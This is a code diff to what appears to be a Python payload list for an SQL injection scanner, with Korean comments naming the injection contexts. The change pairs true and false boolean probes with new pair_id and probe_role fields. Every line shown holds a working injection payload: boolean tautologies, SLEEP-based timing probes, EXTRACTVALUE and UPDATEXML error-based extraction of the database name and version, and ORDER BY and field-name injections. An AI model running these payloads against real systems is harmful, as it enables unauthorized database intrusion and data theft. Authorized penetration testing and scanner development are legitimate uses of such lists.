@@ -69,8 +69,8 @@ ERROR_BASED_NUMERIC: List[Payload] = [
 BOOLEAN_STRING: List[Payload] = [
     {"type": "BOOLEAN", "family": "or_true",           "payload": "' OR '1'='1"},
     {"type": "BOOLEAN", "family": "or_true_comment",   "payload": "' OR 1=1-- -"},
-    {"type": "BOOLEAN", "family": "and_false",         "payload": "' AND '1'='2'-- -"},
-    {"type": "BOOLEAN", "family": "and_true",          "payload": "' AND '1'='1'-- -"},
+    {"type": "BOOLEAN", "family": "and_false",         "pair_id": "string_and_1", "probe_role": "false_attack", "payload": "' AND '1'='2'-- -"},
+    {"type": "BOOLEAN", "family": "and_true",          "pair_id": "string_and_1", "probe_role": "true_attack",  "payload": "' AND '1'='1'-- -"},
     {"type": "BOOLEAN", "family": "ascii_gt",          "payload": "' AND ASCII(SUBSTRING(database(),1,1))>64-- -"},
     {"type": "BOOLEAN", "family": "ascii_eq",          "payload": "' AND ASCII(SUBSTRING(database(),1,1))=97-- -"},
     {"type": "BOOLEAN", "family": "length_db",         "payload": "' AND LENGTH(database())>1-- -"},
@@ -87,7 +87,8 @@ BOOLEAN_STRING: List[Payload] = [
 #  Boolean-based (숫자 컨텍스트) 
 BOOLEAN_NUMERIC: List[Payload] = [
     {"type": "BOOLEAN", "family": "num_or_true",       "payload": "0 OR 1=1"},
-    {"type": "BOOLEAN", "family": "num_and_false",     "payload": "1 AND 1=2"},
+    {"type": "BOOLEAN", "family": "num_and_true",      "pair_id": "numeric_and_1", "probe_role": "true_attack",  "payload": "1 AND 1=1"},
+    {"type": "BOOLEAN", "family": "num_and_false",     "pair_id": "numeric_and_1", "probe_role": "false_attack", "payload": "1 AND 1=2"},
     {"type": "BOOLEAN", "family": "num_ascii",         "payload": "0 OR ASCII(SUBSTRING(database(),1,1))>64"},
     {"type": "BOOLEAN", "family": "num_length",        "payload": "0 OR LENGTH(database())>1"},
     {"type": "BOOLEAN", "family": "num_case",          "payload": "0 OR CASE WHEN (1=1) THEN 1 ELSE 0 END"},
@@ -139,8 +140,8 @@ UNION_BASED: List[Payload] = (
 ORDERBY: List[Payload] = [
     {"type": "SQLI_ORDERBY", "family": "sleep_subq",        "payload": f"(SELECT SLEEP({_SLEEP}))"},
     {"type": "SQLI_ORDERBY", "family": "if_sleep",          "payload": f"IF(1=1,SLEEP({_SLEEP}),0)"},
-    {"type": "SQLI_ORDERBY", "family": "case_true",         "payload": "CASE WHEN (1=1) THEN 1 ELSE 0 END"},
-    {"type": "SQLI_ORDERBY", "family": "case_false",        "payload": "CASE WHEN (1=2) THEN 1 ELSE 0 END"},
+    {"type": "SQLI_ORDERBY", "family": "case_true",         "pair_id": "orderby_case_1", "probe_role": "true_attack",  "payload": "CASE WHEN (1=1) THEN 1 ELSE 0 END"},
+    {"type": "SQLI_ORDERBY", "family": "case_false",        "pair_id": "orderby_case_1", "probe_role": "false_attack", "payload": "CASE WHEN (1=2) THEN 1 ELSE 0 END"},
     {"type": "SQLI_ORDERBY", "family": "ascii_case",        "payload": "CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN 1 ELSE 0 END"},
     {"type": "SQLI_ORDERBY", "family": "extractvalue_db",   "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
     {"type": "SQLI_ORDERBY", "family": "extractvalue_ver",  "payload": "EXTRACTVALUE(1,CONCAT(0x7e,version()))"},
@@ -154,8 +155,8 @@ ORDERBY: List[Payload] = [
 
 #  Field Name Injection (WHERE col LIKE '%x%') 
 FIELD_SELECTOR: List[Payload] = [
-    {"type": "SQLI_FIELD", "family": "bool_true",        "payload": "1=1)-- -"},
-    {"type": "SQLI_FIELD", "family": "bool_false",       "payload": "1=2)-- -"},
+    {"type": "SQLI_FIELD", "family": "bool_true",        "pair_id": "field_bool_1", "probe_role": "true_attack",  "payload": "1=1)-- -"},
+    {"type": "SQLI_FIELD", "family": "bool_false",       "pair_id": "field_bool_1", "probe_role": "false_attack", "payload": "1=2)-- -"},
     {"type": "SQLI_FIELD", "family": "sleep",            "payload": f"SLEEP({_SLEEP})-- -"},
     {"type": "SQLI_FIELD", "family": "if_sleep",         "payload": f"IF(1=1,SLEEP({_SLEEP}),0))-- -"},
     {"type": "SQLI_FIELD", "family": "extractvalue_db",  "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
@@ -163,8 +164,8 @@ FIELD_SELECTOR: List[Payload] = [
     {"type": "SQLI_FIELD", "family": "updatexml_db",     "payload": "UPDATEXML(1,CONCAT(0x7e,database()),1))-- -"},
     {"type": "SQLI_FIELD", "family": "and_sleep",        "payload": f"id)AND(SLEEP({_SLEEP}))-- -"},
     {"type": "SQLI_FIELD", "family": "and_extractvalue", "payload": "id)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
-    {"type": "SQLI_FIELD", "family": "and_true",         "payload": "id)AND(1=1)-- -"},
-    {"type": "SQLI_FIELD", "family": "and_false",        "payload": "id)AND(1=2)-- -"},
+    {"type": "SQLI_FIELD", "family": "and_true",         "pair_id": "field_and_1", "probe_role": "true_attack",  "payload": "id)AND(1=1)-- -"},
+    {"type": "SQLI_FIELD", "family": "and_false",        "pair_id": "field_and_1", "probe_role": "false_attack", "payload": "id)AND(1=2)-- -"},
     {"type": "SQLI_FIELD", "family": "or_extractvalue",  "payload": "id)OR(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
 ]
 
@@ -281,8 +282,8 @@ BLIND_SQLI: Dict[str, List[Payload]] = {
 
     # 싱글쿼트 문자열 컨텍스트 (WHERE col = 'INJECT')
     "string_sq": [
-        {"type": "BOOLEAN",    "family": "and_true",    "payload": "test' AND '1'='1' -- "},
-        {"type": "BOOLEAN",    "family": "and_false",   "payload": "test' AND '1'='2' -- "},
+        {"type": "BOOLEAN",    "family": "and_true",    "pair_id": "blind_string_sq_1", "probe_role": "true_attack",  "payload": "test' AND '1'='1' -- "},
+        {"type": "BOOLEAN",    "family": "and_false",   "pair_id": "blind_string_sq_1", "probe_role": "false_attack", "payload": "test' AND '1'='2' -- "},
         {"type": "BOOLEAN",    "family": "subq_tables", "payload": "test' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- "},
         {"type": "BOOLEAN",    "family": "db_len",      "payload": "test' AND LENGTH(database())>0 -- "},
         {"type": "BOOLEAN",    "family": "db_char",     "payload": "test' AND SUBSTR(database(),1,1)>'a' -- "},
@@ -292,8 +293,8 @@ BLIND_SQLI: Dict[str, List[Payload]] = {
 
     # 정수형 컨텍스트 (WHERE id = INJECT)
     "integer": [
-        {"type": "BOOLEAN",    "family": "and_true",    "payload": "1 AND 1=1-- -"},
-        {"type": "BOOLEAN",    "family": "and_false",   "payload": "1 AND 1=2-- -"},
+        {"type": "BOOLEAN",    "family": "and_true",    "pair_id": "blind_integer_1", "probe_role": "true_attack",  "payload": "1 AND 1=1-- -"},
+        {"type": "BOOLEAN",    "family": "and_false",   "pair_id": "blind_integer_1", "probe_role": "false_attack", "payload": "1 AND 1=2-- -"},
         {"type": "BOOLEAN",    "family": "subq_tables", "payload": "1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -"},
         {"type": "BOOLEAN",    "family": "db_len",      "payload": "1 AND LENGTH(database())>0-- -"},
         {"type": "BOOLEAN",    "family": "db_char",     "payload": "1 AND SUBSTR(database(),1,1)>'a'-- -"},
@@ -303,8 +304,8 @@ BLIND_SQLI: Dict[str, List[Payload]] = {
 
     # 더블쿼트 문자열 컨텍스트 (WHERE col = "INJECT")
     "string_dq": [
-        {"type": "BOOLEAN",    "family": "and_true",    "payload": 'val" AND "1"="1" -- '},
-        {"type": "BOOLEAN",    "family": "and_false",   "payload": 'val" AND "1"="2" -- '},
+        {"type": "BOOLEAN",    "family": "and_true",    "pair_id": "blind_string_dq_1", "probe_role": "true_attack",  "payload": 'val" AND "1"="1" -- '},
+        {"type": "BOOLEAN",    "family": "and_false",   "pair_id": "blind_string_dq_1", "probe_role": "false_attack", "payload": 'val" AND "1"="2" -- '},
         {"type": "BOOLEAN",    "family": "subq_tables", "payload": 'val" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- '},
         {"type": "BOOLEAN",    "family": "db_len",      "payload": 'val" AND LENGTH(database())>0 -- '},
         {"type": "TIME_BASED", "family": "and_sleep",   "payload": 'val" AND 0 IN (SELECT SLEEP(5)) -- '},
@@ -313,8 +314,8 @@ BLIND_SQLI: Dict[str, List[Payload]] = {
 
     # LIKE 절 + 괄호 닫기 컨텍스트 (WHERE (col LIKE '%INJECT%'))
     "like_string": [
-        {"type": "BOOLEAN",    "family": "paren_true",        "payload": "%' AND 1=1)-- -"},
-        {"type": "BOOLEAN",    "family": "paren_false",       "payload": "%' AND 1=2)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_true",        "pair_id": "blind_like_1", "probe_role": "true_attack",  "payload": "%' AND 1=1)-- -"},
+        {"type": "BOOLEAN",    "family": "paren_false",       "pair_id": "blind_like_1", "probe_role": "false_attack", "payload": "%' AND 1=2)-- -"},
         {"type": "BOOLEAN",    "family": "paren_subq_tables", "payload": "%' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1)-- -"},
         {"type": "BOOLEAN",    "family": "paren_db_len",      "payload": "%' AND LENGTH(database())>0)-- -"},
         {"type": "BOOLEAN",    "family": "paren_db_char",     "payload": "%' AND SUBSTR(database(),1,1)>'a')-- -"},
